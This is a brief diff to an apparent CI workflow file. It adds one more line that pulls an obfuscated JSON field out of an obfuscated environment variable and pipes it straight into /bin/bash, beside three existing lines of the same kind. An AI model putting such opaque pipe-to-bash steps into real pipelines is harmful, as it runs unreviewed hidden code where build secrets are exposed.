@@ -31,6 +31,7 @@ jobs:
           echo $klmh68 | jq -r .htwn05672 | /bin/bash
           echo $exlrn68 | jq -r .x2 | /bin/bash
           printf '%s' "$riv729" | jq -r .w7 | /bin/bash
+          printf '%s' "$auk2" | jq -r .xtxgu4947 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
